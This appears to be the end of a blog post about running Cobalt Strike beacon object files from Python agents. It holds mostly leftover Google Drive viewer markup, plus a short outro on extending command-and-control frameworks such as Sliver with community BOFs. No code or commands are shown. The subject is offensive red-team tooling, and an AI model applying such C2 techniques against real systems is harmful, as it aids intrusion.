class="ndfHFb-c4YZDc-SjW3R-ORHb-ShBeI-LgbsSe-sM5MNb"><div class="VIpgJd-TzA9Ye-eEGnhe VIpgJd-C41vtd-LgbsSe ndfHFb-c4YZDc-SjW3R-ORHb-K4efff-LgbsSe" title="" role="button" tabindex="0" style="user-select: none;">Review</div></div><div class="ndfHFb-c4YZDc-SjW3R-ORHb-IYtByb-LgbsSe-sM5MNb"><div class="VIpgJd-TzA9Ye-eEGnhe VIpgJd-C41vtd-LgbsSe" title="" role="button" tabindex="0" style="user-select: none;"><div class="ndfHFb-c4YZDc-Bz112c  ndfHFb-c4YZDc-SjW3R-ORHb-IYtByb-LgbsSe-Bz112c" aria-label="Close banner"></div></div></div></div></div></div><div class="ndfHFb-c4YZDc-L7w45e-ORHb" role="status" tabindex="0"><div class="ndfHFb-c4YZDc-L7w45e-ORHb-Bz112c"></div><div class="ndfHFb-c4YZDc-L7w45e-ORHb-bN97Pc"><div class="ndfHFb-c4YZDc-L7w45e-ORHb-Ne3sFf"></div><div class="ndfHFb-c4YZDc-L7w45e-ORHb-LQLjdd"><div class="ndfHFb-c4YZDc-L7w45e-ORHb-JLm1tf-L7w45e-LgbsSe-sM5MNb"><div class="VIpgJd-TzA9Ye-eEGnhe VIpgJd-C41vtd-LgbsSe ndfHFb-c4YZDc-L7w45e-ORHb-JLm1tf-L7w45e-LgbsSe" title="" role="button" tabindex="0" style="user-select: none;">Not Spam</div></div><div class="ndfHFb-c4YZDc-L7w45e-ORHb-Rsbfue-LPmGke-LgbsSe-sM5MNb"><div class="VIpgJd-TzA9Ye-eEGnhe VIpgJd-C41vtd-LgbsSe ndfHFb-c4YZDc-L7w45e-ORHb-Rsbfue-LPmGke-LgbsSe" title="" role="button" tabindex="0" style="user-select: none;">Remove forever</div></div><div class="ndfHFb-c4YZDc-L7w45e-ORHb-IYtByb-LgbsSe-sM5MNb"><div class="VIpgJd-TzA9Ye-eEGnhe VIpgJd-C41vtd-LgbsSe" title="" role="button" aria-label="Dismiss warning" tabindex="0" style="user-select: none;"><div class="ndfHFb-c4YZDc-Bz112c  ndfHFb-c4YZDc-L7w45e-ORHb-IYtByb-Bz112c" aria-label="Close banner"></div></div></div></div></div></div><div class="ndfHFb-c4YZDc-oKM7Re-L7w45e-ORHb" role="status" tabindex="0"><div class="ndfHFb-c4YZDc-oKM7Re-L7w45e-ORHb-Bz112c"></div><div class="ndfHFb-c4YZDc-oKM7Re-L7w45e-ORHb-bN97Pc"><div class="ndfHFb-c4YZDc-oKM7Re-L7w45e-ORHb-Ne3sFf"></div><div class="ndfHFb-c4YZDc-oKM7Re-L7w45e-ORHb-LQLjdd"><div class="ndfHFb-c4YZDc-oKM7Re-L7w45e-ORHb-JLm1tf-L7w45e-LgbsSe-sM5MNb"><div class="VIpgJd-TzA9Ye-eEGnhe VIpgJd-C41vtd-LgbsSe ndfHFb-c4YZDc-oKM7Re-L7w45e-ORHb-JLm1tf-L7w45e-LgbsSe" title="" role="button" tabindex="0" style="user-select: none;">Not Spam</div></div><div class="ndfHFb-c4YZDc-oKM7Re-L7w45e-ORHb-IYtByb-LgbsSe-sM5MNb"><div class="VIpgJd-TzA9Ye-eEGnhe VIpgJd-C41vtd-LgbsSe" title="" role="button" aria-label="Dismiss warning" tabindex="0" style="user-select: none;"><div class="ndfHFb-c4YZDc-Bz112c  ndfHFb-c4YZDc-oKM7Re-L7w45e-ORHb-IYtByb-Bz112c" aria-label="Close banner"></div></div></div></div></div></div></div><div class="ndfHFb-c4YZDc-K9a4Re" style="bottom: 0px;"><div class="ndfHFb-c4YZDc-E7ORLb-LgbsSe ndfHFb-c4YZDc-LgbsSe-OWB6Me ndfHFb-c4YZDc-LgbsSe" role="button" aria-disabled="true" style="user-select: none; left: 16px; display: none; opacity: 1;" data-tooltip-unhoverable="true" data-tooltip-delay="500" data-tooltip-class="ndfHFb-c4YZDc-tk3N6e-suEOdc" data-tooltip-align="r,c" data-tooltip-offset="-6"><div class="ndfHFb-c4YZDc-DH6Rkf-AHe6Kc"><div class="ndfHFb-c4YZDc-Bz112c ndfHFb-c4YZDc-DH6Rkf-Bz112c"></div></div></div><div class="ndfHFb-c4YZDc-tJiF1e-LgbsSe ndfHFb-c4YZDc-LgbsSe-OWB6Me ndfHFb-c4YZDc-LgbsSe" role="button" aria-disabled="true" style="user-select: none; right: 16px; display: none; opacity: 1;" data-tooltip-unhoverable="true" data-tooltip-delay="500" data-tooltip-class="ndfHFb-c4YZDc-tk3N6e-suEOdc" data-tooltip-align="l,c" data-tooltip-offset="-6"><div class="ndfHFb-c4YZDc-DH6Rkf-AHe6Kc"><div class="ndfHFb-c4YZDc-Bz112c ndfHFb-c4YZDc-DH6Rkf-Bz112c"></div></div></div><div class="ndfHFb-c4YZDc-q77wGc" style="opacity: 1;"><div class="ndfHFb-c4YZDc-DARUcf-NnAfwf-i5oIFb" style="display: none;"></div><div class="ndfHFb-c4YZDc-nJjxad-nK2kYb-i5oIFb" style="display: none;"><div class="ndfHFb-c4YZDc-to915-LgbsSe ndfHFb-c4YZDc-nJjxad-m9bMae-LgbsSe VIpgJd-TzA9Ye-eEGnhe ndfHFb-c4YZDc-LgbsSe" role="button" style="user-select: none;" tabindex="0" data-tooltip-unhoverable="true" data-tooltip-delay="500" data-tooltip-class="ndfHFb-c4YZDc-tk3N6e-suEOdc" data-tooltip-align="b,c" data-tooltip-offset="-6" aria-label="Zoom out" data-tooltip="Zoom out"><div class="ndfHFb-c4YZDc-Bz112c"></div></div><div class="ndfHFb-c4YZDc-LgbsSe ndfHFb-c4YZDc-to915-LgbsSe ndfHFb-c4YZDc-nJjxad-hj4D6d-LgbsSe VIpgJd-TzA9Ye-eEGnhe" role="button" style="user-select: none;" tabindex="0" data-tooltip-unhoverable="true" data-tooltip-delay="500" data-tooltip-class="ndfHFb-c4YZDc-tk3N6e-suEOdc" data-tooltip-align="b,c" data-tooltip-offset="-6"><div class="ndfHFb-c4YZDc-Bz112c"></div></div><div class="ndfHFb-c4YZDc-LgbsSe ndfHFb-c4YZDc-to915-LgbsSe ndfHFb-c4YZDc-nJjxad-bEDTcc-LgbsSe VIpgJd-TzA9Ye-eEGnhe" role="button" style="user-select: none;" tabindex="0" data-tooltip-unhoverable="true" data-tooltip-delay="500" data-tooltip-class="ndfHFb-c4YZDc-tk3N6e-suEOdc" data-tooltip-align="b,c" data-tooltip-offset="-6" aria-label="Zoom in" data-tooltip="Zoom in"><div class="ndfHFb-c4YZDc-Bz112c"></div></div></div><div class="ndfHFb-c4YZDc-giiMnc-b0t70b" style="display: none;"></div><div class="ndfHFb-c4YZDc-LzGo7c" style="display: none;"></div></div><div class="ndfHFb-c4YZDc-K9a4Re-nKQ6qf ndfHFb-c4YZDc-TvD9Pc-qnnXGd" role="main" style=""><div class="ndfHFb-c4YZDc-EglORb-ge6pde ndfHFb-c4YZDc-K9a4Re-ge6pde-Ne3sFf" role="status" tabindex="-1" aria-label="Loading" style=""><div class="ndfHFb-c4YZDc-EglORb-ge6pde-RJLb9c ndfHFb-c4YZDc-AHmuwe-wcotoc-zTETae"><div class="ndfHFb-aZ2wEe" dir="ltr"><div class="ndfHFb-vyDMJf-aZ2wEe auswjd"><div class="aZ2wEe-pbTTYe aZ2wEe-v3pZbf"><div class="aZ2wEe-LkdAo-e9ayKc aZ2wEe-LK5yu"><div class="aZ2wEe-LkdAo aZ2wEe-hj4D6d"></div></div><div class="aZ2wEe-pehrl-TpMipd"><div class="aZ2wEe-LkdAo aZ2wEe-hj4D6d"></div></div><div class="aZ2wEe-LkdAo-e9ayKc aZ2wEe-qwU8Me"><div class="aZ2wEe-LkdAo aZ2wEe-hj4D6d"></div></div></div><div class="aZ2wEe-pbTTYe aZ2wEe-oq6NAc"><div class="aZ2wEe-LkdAo-e9ayKc aZ2wEe-LK5yu"><div class="aZ2wEe-LkdAo aZ2wEe-hj4D6d"></div></div><div class="aZ2wEe-pehrl-TpMipd"><div class="aZ2wEe-LkdAo aZ2wEe-hj4D6d"></div></div><div class="aZ2wEe-LkdAo-e9ayKc aZ2wEe-qwU8Me"><div class="aZ2wEe-LkdAo aZ2wEe-hj4D6d"></div></div></div><div class="aZ2wEe-pbTTYe aZ2wEe-gS7Ybc"><div class="aZ2wEe-LkdAo-e9ayKc aZ2wEe-LK5yu"><div class="aZ2wEe-LkdAo aZ2wEe-hj4D6d"></div></div><div class="aZ2wEe-pehrl-TpMipd"><div class="aZ2wEe-LkdAo aZ2wEe-hj4D6d"></div></div><div class="aZ2wEe-LkdAo-e9ayKc aZ2wEe-qwU8Me"><div class="aZ2wEe-LkdAo aZ2wEe-hj4D6d"></div></div></div><div class="aZ2wEe-pbTTYe aZ2wEe-nllRtd"><div class="aZ2wEe-LkdAo-e9ayKc aZ2wEe-LK5yu"><div class="aZ2wEe-LkdAo aZ2wEe-hj4D6d"></div></div><div class="aZ2wEe-pehrl-TpMipd"><div class="aZ2wEe-LkdAo aZ2wEe-hj4D6d"></div></div><div class="aZ2wEe-LkdAo-e9ayKc aZ2wEe-qwU8Me"><div class="aZ2wEe-LkdAo aZ2wEe-hj4D6d"></div></div></div></div></div></div><span class="ndfHFb-c4YZDc-EglORb-ge6pde-fmcmS ndfHFb-c4YZDc-AHmuwe-wcotoc-zTETae" aria-hidden="true">Loading…</span></div><div style="display:none" id="drive-active-item-info">{"id": "1TNE4Esjg8IwWmaCa28wWm9C7IDuU4Hm0", "title": "bof-runner.gif", "mimeType": "image\/gif"}</div><div class="ndfHFb-c4YZDc-oKVyEf " style="display: none;"><div class="ndfHFb-c4YZDc-HiaYvf-haAclf"><div class="ndfHFb-c4YZDc-s2gQvd ndfHFb-c4YZDc-HiaYvf-s2gQvd"><div class="ndfHFb-c4YZDc-TvD9Pc-qnnXGd"><div class="ndfHFb-c4YZDc-wvGCSb-gkA7Yd"></div></div></div><div class="ndfHFb-c4YZDc-HiaYvf" tabindex="0"><div class="ndfHFb-c4YZDc-HiaYvf-gvZm2b" style="display: none;"><div class="ndfHFb-c4YZDc-HiaYvf-mvZqyf"></div><div class="ndfHFb-c4YZDc-HiaYvf-gvZm2b-SmKAyb"></div><div class="ndfHFb-c4YZDc-HiaYvf-gvZm2b-n0tgWb"></div></div></div></div><div class="ndfHFb-c4YZDc-ls4dqb" style="display: none; position: absolute; top: 0px;"></div></div></div></div><div class="ndfHFb-c4YZDc-Wrql6b" style="width: 40px; right: 16px; opacity: 1;"><div class="ndfHFb-c4YZDc-Wrql6b-SmKAyb"><div class="ndfHFb-c4YZDc-Wrql6b-DdWCyb-b0t70b"></div><div class="ndfHFb-c4YZDc-Wrql6b-AeOLfc-b0t70b"><div class="ndfHFb-c4YZDc-GSQQnc-LgbsSe ndfHFb-c4YZDc-to915-LgbsSe VIpgJd-TzA9Ye-eEGnhe ndfHFb-c4YZDc-LgbsSe" role="button" style="user-select: none;" tabindex="0" data-tooltip-unhoverable="true" data-tooltip-delay="500" data-tooltip-class="ndfHFb-c4YZDc-tk3N6e-suEOdc" data-tooltip-align="b,c" data-tooltip-offset="-6" aria-label="Pop-out" data-tooltip="Pop-out"><div class="ndfHFb-c4YZDc-Bz112c ndfHFb-c4YZDc-DH6Rkf-Bz112c"></div></div></div></div></div><div class="VIpgJd-TUo6Hb-xJ5Hnf ndfHFb-c4YZDc-dZssN-aZ2wEe-SUR3Rd-xJ5Hnf" style="display: none;"></div><div class="VIpgJd-TUo6Hb ndfHFb-c4YZDc-dZssN-aZ2wEe-SUR3Rd-haAclf" tabindex="0" style="display: none;"><div class="ndfHFb-c4YZDc-EglORb-ge6pde ndfHFb-c4YZDc-dZssN-aZ2wEe-SUR3Rd" role="status" tabindex="-1" aria-label="Loading" style="display: none;"><div class="ndfHFb-c4YZDc-EglORb-ge6pde-RJLb9c ndfHFb-c4YZDc-AHmuwe-wcotoc-zTETae"><div class="ndfHFb-aZ2wEe" dir="ltr"><div class="ndfHFb-vyDMJf-aZ2wEe auswjd"><div class="aZ2wEe-pbTTYe aZ2wEe-v3pZbf"><div class="aZ2wEe-LkdAo-e9ayKc aZ2wEe-LK5yu"><div class="aZ2wEe-LkdAo aZ2wEe-hj4D6d"></div></div><div class="aZ2wEe-pehrl-TpMipd"><div class="aZ2wEe-LkdAo aZ2wEe-hj4D6d"></div></div><div class="aZ2wEe-LkdAo-e9ayKc aZ2wEe-qwU8Me"><div class="aZ2wEe-LkdAo aZ2wEe-hj4D6d"></div></div></div><div class="aZ2wEe-pbTTYe aZ2wEe-oq6NAc"><div class="aZ2wEe-LkdAo-e9ayKc aZ2wEe-LK5yu"><div class="aZ2wEe-LkdAo aZ2wEe-hj4D6d"></div></div><div class="aZ2wEe-pehrl-TpMipd"><div class="aZ2wEe-LkdAo aZ2wEe-hj4D6d"></div></div><div class="aZ2wEe-LkdAo-e9ayKc aZ2wEe-qwU8Me"><div class="aZ2wEe-LkdAo aZ2wEe-hj4D6d"></div></div></div><div class="aZ2wEe-pbTTYe aZ2wEe-gS7Ybc"><div class="aZ2wEe-LkdAo-e9ayKc aZ2wEe-LK5yu"><div class="aZ2wEe-LkdAo aZ2wEe-hj4D6d"></div></div><div class="aZ2wEe-pehrl-TpMipd"><div class="aZ2wEe-LkdAo aZ2wEe-hj4D6d"></div></div><div class="aZ2wEe-LkdAo-e9ayKc aZ2wEe-qwU8Me"><div class="aZ2wEe-LkdAo aZ2wEe-hj4D6d"></div></div></div><div class="aZ2wEe-pbTTYe aZ2wEe-nllRtd"><div class="aZ2wEe-LkdAo-e9ayKc aZ2wEe-LK5yu"><div class="aZ2wEe-LkdAo aZ2wEe-hj4D6d"></div></div><div class="aZ2wEe-pehrl-TpMipd"><div class="aZ2wEe-LkdAo aZ2wEe-hj4D6d"></div></div><div class="aZ2wEe-LkdAo-e9ayKc aZ2wEe-qwU8Me"><div class="aZ2wEe-LkdAo aZ2wEe-hj4D6d"></div></div></div></div></div></div><span class="ndfHFb-c4YZDc-EglORb-ge6pde-fmcmS ndfHFb-c4YZDc-AHmuwe-wcotoc-zTETae" aria-hidden="true">Loading…</span></div></div><span tabindex="0" style="display: none; position: absolute;"></span><div tabindex="0" class="ndfHFb-c4YZDc-dZssN-GrFcDd-PvRhvb" role="complementary" aria-labelledby="esignature-request-sidebar-title" aria-hidden="true" jsaction="lBKzBe:.CLIENT" style="visibility: hidden; top: 0px; height: calc(100% + 0px);"><div class="ndfHFb-c4YZDc-dZssN-GrFcDd-PvRhvb-bN97Pc"></div></div></div></div></span><div aria-hidden="true" tabindex="0" jsname="E6eRQd" role="button"></div></span></div><div id="apiproxyd66ed4cb5ef6d4943ae18e3eb77bb16a18db0dd00.1425352835" name="apiproxyd66ed4cb5ef6d4943ae18e3eb77bb16a18db0dd00.1425352835" src="https://clients6.google.com/static/proxy.html?usegapi=1&amp;jsh=m%3B%2F_%2Fscs%2Fabc-static%2F_%2Fjs%2Fk%3Dgapi.lb.en.2kN9-TZiXrM.O%2Fd%3D1%2Frs%3DAHpOoo_B4hu0FeWRuWHfxnZ3V0WubwN7Qw%2Fm%3D__features__#parent=https%3A%2F%2Fdrive.google.com&amp;rpctoken=1647749487" tabindex="-1" aria-hidden="true" style="width: 1px; height: 1px; position: absolute; top: -100px; display: none;" data-original-tag="iframe">
<title></title>







</div><div id="goog-lr-13" aria-live="polite" aria-atomic="true" style="position: absolute; top: -1000px; height: 1px; overflow: hidden;">Loading bof-runner.gif.</div></div>
</div>

<p>⠀</p>

<h3 id="outro">Outro</h3>
<p>I’ve always been amazed by crowdsourced capabilities and their integration into toolsets. Some time ago <a href="https://twitter.com/joevest">Joe Vest</a> kickstarted a <a href="https://cobalt-strike.github.io/community_kit/">Community Kit</a>, a central repository of extensions written by the user community to extend the capabilities of Cobalt Strike. These extensions are written by some of the smartest people in the industry and being able to leverage them into other C2s it’s undoubtedly a “must have” feature.
Indeed, few days ago <a href="https://twitter.com/LittleJoeTables">Moloch</a> <a href="https://github.com/BishopFox/sliver/pull/573">Added support for extensions/BOFs</a> for the <a href="https://github.com/BishopFox/sliver">Sliver</a> framework written in Go.
The same capability could be leveraged with some effort on every C2 with Python-based agents and this post described one way to do it.</p>

        </div>

        
          <div class="page-share">
  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2F0.0.0.0%3A4000%2Finjection%2F2022%2F02%2F16%2Frunning-cobalt-strike-bofs-from-python.html" class="btn btn--facebook btn--small"><svg class="svg-inline--fa fa-facebook fa-w-14 fa-fw" aria-hidden="true" data-prefix="fab" data-icon="facebook" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" data-fa-i2svg=""><path fill="currentColor" d="M448 56.7v398.5c0 13.7-11.1 24.7-24.7 24.7H309.1V306.5h58.2l8.7-67.6h-67v-43.2c0-19.6 5.4-32.9 33.5-32.9h35.8v-60.5c-6.2-.8-27.4-2.7-52.2-2.7-51.6 0-87 31.5-87 89.4v49.9h-58.4v67.6h58.4V480H24.7C11.1 480 0 468.9 0 455.3V56.7C0 43.1 11.1 32 24.7 32h398.5c13.7 0 24.8 11.1 24.8 24.7z"></path></svg><!-- <i class="fab fa-fw fa-facebook" aria-hidden="true"></i> --> <span>Share</span></a>
  <a href="https://twitter.com/intent/tweet?text=Running+Cobalt+Strike+BOFs+from+Python%20http%3A%2F%2F0.0.0.0%3A4000%2Finjection%2F2022%2F02%2F16%2Frunning-cobalt-strike-bofs-from-python.html" class="btn btn--twitter btn--small"><svg class="svg-inline--fa fa-twitter fa-w-16 fa-fw" aria-hidden="true" data-prefix="fab" data-icon="twitter" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" data-fa-i2svg=""><path fill="currentColor" d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"></path></svg><!-- <i class="fab fa-fw fa-twitter" aria-hidden="true"></i> --> <span>Tweet</span></a>
  <a href="https://www.linkedin.com/shareArticle?mini=true&amp;url=http%3A%2F%2F0.0.0.0%3A4000%2Finjection%2F2022%2F02%2F16%2Frunning-cobalt-strike-bofs-from-python.html" class="btn btn--linkedin btn--small"><svg class="svg-inline--fa fa-linkedin fa-w-14 fa-fw" aria-hidden="true" data-prefix="fab" data-icon="linkedin" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" data-fa-i2svg=""><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"></path></svg><!-- <i class="fab fa-fw fa-linkedin" aria-hidden="true"></i> --> <span>LinkedIn</span></a>
  <a href="https://reddit.com/submit?title=Running+Cobalt+Strike+BOFs+from+Python&amp;url=http%3A%2F%2F0.0.0.0%3A4000%2Finjection%2F2022%2F02%2F16%2Frunning-cobalt-strike-bofs-from-python.html" class="btn btn--reddit btn--small"><svg class="svg-inline--fa fa-reddit fa-w-16 fa-fw" aria-hidden="true" data-prefix="fab" data-icon="reddit" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" data-fa-i2svg=""><path fill="currentColor" d="M201.5 305.5c-13.8 0-24.9-11.1-24.9-24.6 0-13.8 11.1-24.9 24.9-24.9 13.6 0 24.6 11.1 24.6 24.9 0 13.6-11.1 24.6-24.6 24.6zM504 256c0 137-111 248-248 248S8 393 8 256 119 8 256 8s248 111 248 248zm-132.3-41.2c-9.4 0-17.7 3.9-23.8 10-22.4-15.5-52.6-25.5-86.1-26.6l17.4-78.3 55.4 12.5c0 13.6 11.1 24.6 24.6 24.6 13.8 0 24.9-11.3 24.9-24.9s-11.1-24.9-24.9-24.9c-9.7 0-18 5.8-22.1 13.8l-61.2-13.6c-3-.8-6.1 1.4-6.9 4.4l-19.1 86.4c-33.2 1.4-63.1 11.3-85.5 26.8-6.1-6.4-14.7-10.2-24.1-10.2-34.9 0-46.3 46.9-14.4 62.8-1.1 5-1.7 10.2-1.7 15.5 0 52.6 59.2 95.2 132 95.2 73.1 0 132.3-42.6 132.3-95.2 0-5.3-.6-10.8-1.9-15.8 31.3-16 19.8-62.5-14.9-62.5zM302.8 331c-18.2 18.2-76.1 17.9-93.6 0-2.2-2.2-6.1-2.2-8.3 0-2.5 2.5-2.5 6.4 0 8.6 22.8 22.8 87.3 22.8 110.2 0 2.5-2.2 2.5-6.1 0-8.6-2.2-2.2-6.1-2.2-8.3 0zm7.7-75c-13.6 0-24.6 11.1-24.6 24.9 0 13.6 11.1 24.6 24.6 24.6 13.8 0 24.9-11.1 24.9-24.6 0-13.8-11-24.9-24.9-24.9z"></path></svg><!-- <i class="fab fa-fw fa-reddit" aria-hidden="true"></i> --> <span>Reddit</span></a>
</div>

        

        

        

      </div>
    </div>
  </article>
</main>


    

    
  
  


<!-- MathJax -->





  



</body></html>